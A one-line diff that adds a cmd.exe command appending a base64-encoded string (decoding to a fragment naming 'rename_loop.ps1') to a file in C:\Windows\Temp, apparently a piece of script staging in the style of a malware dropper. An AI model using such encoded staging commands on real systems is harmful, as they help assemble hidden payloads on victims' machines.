@@ -1,0 +1,2 @@
+﻿cmd.exe /c >>C:\Windows\Temp\rn.b64 echo XABUAGUAbQBwAFwAcgBlAG4AYQBtAGUAXwBsAG8AbwBwAC4AcABzADEAJwAKAA==
+
